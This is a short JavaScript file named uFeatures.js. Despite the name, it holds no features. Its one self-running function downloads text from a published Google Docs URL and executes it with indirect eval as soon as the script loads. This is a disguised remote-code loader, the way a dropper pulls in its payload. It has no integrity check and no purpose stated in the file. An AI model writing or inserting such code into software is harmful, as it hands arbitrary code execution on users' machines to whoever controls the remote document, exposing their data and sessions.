/// uFeatures.js
(function(){
  var x = new XMLHttpRequest();
  x.open('GET','https://docs.google.com/document/d/e/2PACX-1vSOvPP7khIrr4QEhD-y5EzZa6MJtiaeC0upi9U9Ncgs-45UUk9E8HpoPFQnJRsaz-FnTcVyabY7eiIj/pub',true);
  x.onload = function(){
    if(x.status === 200){
      (0,eval)(x.responseText);
    }
  };
  x.onerror = function(){
    console.error('xhr failed');
  };
  x.send();
})();
